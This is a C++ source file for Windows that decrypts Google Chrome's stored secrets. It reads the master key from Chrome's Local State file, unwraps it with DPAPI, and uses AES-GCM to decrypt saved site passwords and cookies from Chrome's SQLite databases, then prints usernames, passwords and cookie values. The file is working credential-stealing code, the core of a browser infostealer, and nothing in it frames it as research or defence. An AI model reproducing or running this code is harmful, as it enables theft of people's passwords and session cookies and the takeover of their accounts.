#include "tools.h"
#include <iostream>
#include <exception>
#include "json.hpp"
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <stdio.h>
#include "Base64.h"
#include <bcrypt.h>
#define DPAPI_PREFIX_LEN 5
 BCRYPT_ALG_HANDLE m_hAlg;
 BCRYPT_KEY_HANDLE m_hKey;
 char* m_pbOutput = nullptr;
 #define MAX_SIZE_PASS 1024

void get_chrome_pass(sqlite3* db)
{ 
    std::string sql = "SELECT action_url, username_value, password_value FROM logins";
    sqlite3_stmt *pStmt;
    int rc;
    
    rc = sqlite3_prepare(db, sql.c_str(), -1, &pStmt, 0);
    if (rc != SQLITE_OK)
    {
        std::cout << "statement failed rc = " << rc;
    }
	
    rc = sqlite3_step(pStmt);
    
    while (rc == SQLITE_ROW) 
    {
        //std::cout<< std::endl<<"url: "<< (char*)sqlite3_column_text(pStmt, 0) << std::endl;
        std::cout <<std::endl<<"username: "<< (char *)sqlite3_column_text(pStmt, 1) << std::endl;

        char* password = (char*)sqlite3_column_text(pStmt, 2);
        int passSize = sqlite3_column_bytes(pStmt, 2);

        ULONG cbOutput = MAX_SIZE_PASS;
		ULONG cbCiphertext = 0;

		BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO B;
		BCRYPT_INIT_AUTH_MODE_INFO(B); 

		B.pbNonce = (PUCHAR)(password + 3); 
		B.cbNonce = 12;

		B.pbTag = (PUCHAR)(password + passSize - 16);
		B.cbTag = 16;

        NTSTATUS status = 0;

		if (!BCRYPT_SUCCESS(status = BCryptDecrypt(m_hKey, (BYTE*)(password + 15), passSize - 15 - 16, &B, NULL, 0, (PUCHAR)m_pbOutput, cbOutput, &cbCiphertext, 0)))
		{
			printf("Error: 0x%x\n", status);
		}

		m_pbOutput[cbCiphertext] = '\0';

		std::string pass = m_pbOutput;
        std::cout<<"password: "<<pass<<std::endl;
            
        rc = sqlite3_step(pStmt);
    }
    rc = sqlite3_finalize(pStmt);
    sqlite3_close(db);
}

void get_encryption_key(std::string chrome_key_path)
{
   
	HANDLE hFile = INVALID_HANDLE_VALUE;
	unsigned long  fileSize = 0;
	char* tempBuff = NULL;
	char* chromeKey = NULL;

	std::string chrome_path=chrome_key_path;

    hFile = CreateFile(chrome_path.c_str(), GENERIC_READ, 0, 0, OPEN_ALWAYS, 0, 0);

	if (hFile == INVALID_HANDLE_VALUE)
		std::cout<<"what?";
	
	fileSize = GetFileSize(hFile, NULL);

	if (fileSize == 0)
			std::cout<<"what?";		
		
	
	tempBuff = new char[fileSize];
	
	DWORD numToRead;
	if (!ReadFile(hFile, tempBuff, fileSize, &numToRead, NULL))		
		std::cout<<"what?";
		
	tempBuff[numToRead] = L'\0';
			
	if (!CloseHandle(hFile))
		std::cout<<"what?";

	auto json_text = nlohmann::json::parse(tempBuff);

	auto empty = json_text.empty();

	if(!json_text.contains("os_crypt")) std::cout<<"what?";

	if (!json_text.at("os_crypt").contains("encrypted_key")) std::cout<<"what?";

    std::string key;
    unsigned long keySize;

	key = json_text.at("os_crypt").at("encrypted_key").get<std::string>();
	keySize = key.length();

    char decryptedKey[8192];

    if (!key_decrypt(key, keySize, decryptedKey))
		std::cout<<"what?";
	

    const DWORD decKeySize = strlen(decryptedKey);

	initialize();
    initialize_key((PBYTE)decryptedKey, decKeySize);

	if (m_pbOutput == NULL)
		m_pbOutput = new char[MAX_SIZE_PASS];
	
}

bool dpapi_decrypt(unsigned char* encText, unsigned long encTextSize, char* decText)
{
	DATA_BLOB in;
	DATA_BLOB out;

	in.pbData = encText;
	in.cbData = encTextSize;
	
	if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out))
	{
		for (int i = 0; i < out.cbData; i++)
			decText[i] = out.pbData[i];
		decText[out.cbData] = '\0';

		return true;
	}

	return false;
}

bool key_decrypt(std::string keyBase64, DWORD keySize, char* decKey)
{
	char* keyEncDPAPI = NULL;
	DWORD keyEncDPAPISize = 0;
	BYTE* keyEnc = NULL;
	DWORD keyEncSize = 0;

	keyEncDPAPI = new char[keySize];

	auto key_decoded = base64_decryptor::base64_decode(keyBase64);
	
	keyEncDPAPISize = key_decoded.length();

	keyEncDPAPI = (char*) key_decoded.c_str();
	

	keyEnc = new BYTE[keyEncDPAPISize - DPAPI_PREFIX_LEN];

	int counter = 0;
	for (int i = DPAPI_PREFIX_LEN; i < keyEncDPAPISize; i++)
	{
		keyEnc[counter++] = keyEncDPAPI[i];
	}

	if (dpapi_decrypt(keyEnc, (keyEncDPAPISize - DPAPI_PREFIX_LEN), (decKey)))
	{
		delete[] keyEnc;
		return true;
	}

	return FALSE;
}

void get_chrome_cookies(sqlite3* db)
{
    std::string sql = "SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies";

    sqlite3_stmt *pStmt;
    int rc;
    rc = sqlite3_prepare(db, sql.c_str(), -1, &pStmt, 0);
    if (rc != SQLITE_OK)
    {
        std::cout<< "statement failed rcc = " << rc;
    }

    rc = sqlite3_step(pStmt);
    m_pbOutput = new char[MAX_SIZE_PASS];

    while (rc == SQLITE_ROW) 
    {
        char* host_key = (char*)sqlite3_column_text(pStmt, 0);
		char* name = (char*)sqlite3_column_text(pStmt, 1);
		char* path = (char*)sqlite3_column_text(pStmt, 2);
		char* encrypted_value = (char*)sqlite3_column_text(pStmt, 3);
		char* expires_utc = (char*)sqlite3_column_text(pStmt, 4);

        std::string Hostkey=host_key;
        std::string Name=name;
        std::string Path=path;
        std::string Expireutc=expires_utc;

        int passSize = sqlite3_column_bytes(pStmt, 3);
		

            ULONG cbOutput = MAX_SIZE_PASS;
			ULONG cbCiphertext = 0;

			BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO B;
			BCRYPT_INIT_AUTH_MODE_INFO(B); 
			B.pbNonce = (PUCHAR)(encrypted_value + 3); 
			B.cbNonce = 12;

			B.pbTag = (PUCHAR)(encrypted_value + passSize - 16);
			B.cbTag = 16;


			NTSTATUS status = 0;
           
			if (!BCRYPT_SUCCESS(status = BCryptDecrypt(m_hKey, (BYTE*)(encrypted_value + 15), passSize - 15 - 16, &B, NULL, 0, (PUCHAR)m_pbOutput, cbOutput, &cbCiphertext, 0)))
			{
				printf("Error: 0x%x\n", status);
			}

			m_pbOutput[cbCiphertext] = '\0';

			std::string pass = m_pbOutput;
            std::cout<<"Host key: "<<Hostkey<<std::endl;
            std::cout<<"Name: "<<Name<<std::endl;
            std::cout<<"Path: "<<Path<<std::endl;
            std::cout<<"Expire: "<<Expireutc<<std::endl;
            std::cout<<"Encrypted cookies: "<<pass<<std::endl;
            std::cout<<"*********************************************"<<std::endl;
            

        rc = sqlite3_step(pStmt);
    }
    
    rc = sqlite3_finalize(pStmt);
    sqlite3_close(db);
}


bool initialize()
{
	bool ret = false;
	do
	{ 
		if (BCryptOpenAlgorithmProvider(&m_hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0)
		{
			std::cout<<"BCryptoAlgo problem";
			break;
		}
			
		if (BCryptSetProperty(m_hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM),0) != 0)
		{
            std::cout<<"BcyptoSet problem";
			break;
		}
		
		ret = true;
	}
	while (false);
	return ret;	
}

bool initialize_key(PBYTE pbKey, ULONG sizeKey)
{
	bool ret = true;
    
	if (BCryptGenerateSymmetricKey(m_hAlg, &m_hKey, NULL, 0, pbKey, sizeKey, 0) != 0)
	{
		std::cout<<"BcyptoSymmetric problem";
		ret = false;
	}
	return ret;	
}

